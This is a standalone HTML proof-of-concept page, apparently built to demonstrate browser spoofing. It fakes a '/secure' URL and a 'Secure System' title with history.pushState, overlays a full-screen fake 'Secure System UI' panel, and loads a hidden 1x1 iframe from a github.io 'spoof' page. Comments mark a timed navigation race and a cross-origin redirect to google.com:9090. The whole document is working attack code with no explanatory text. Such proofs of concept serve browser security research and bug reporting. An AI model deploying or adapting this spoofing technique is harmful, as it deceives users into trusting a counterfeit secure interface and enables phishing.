<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Trusted Container</title>

<style>
  body { font-family: system-ui; }
  #panel {
    display: none;
    position: fixed;
    inset: 0;
    background: white;
    z-index: 9999;
    text-align: center;
    padding-top: 40vh;
  }
</style>
</head>
<body>

<h2>Parent Page (Trusted)</h2>

<button id="trigger">Open Secure Panel</button>

<div id="panel">
  <h1>Secure System UI</h1>
  <p>Loading…</p>
</div>

<iframe
  src="https://cnfdnfial-ops.github.io/spoof/originB.html"
  sandbox="allow-scripts"
  style="width:1px;height:1px;border:0">
</iframe>

<script>
const trigger = document.getElementById('trigger');
const panel = document.getElementById('panel');

trigger.onclick = () => {
  // STEP 1 — fake trusted state
  history.pushState({}, '', '/secure');
  document.title = 'Secure System';

  panel.style.display = 'block';
};

// STEP 2 — navigation race
window.addEventListener('pageshow', () => {
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        // STEP 3 — cross-origin redirect
        location.href = 'https://google.com:9090';
      }, 80);
    });
  });
});
</script>

</body>
</html>
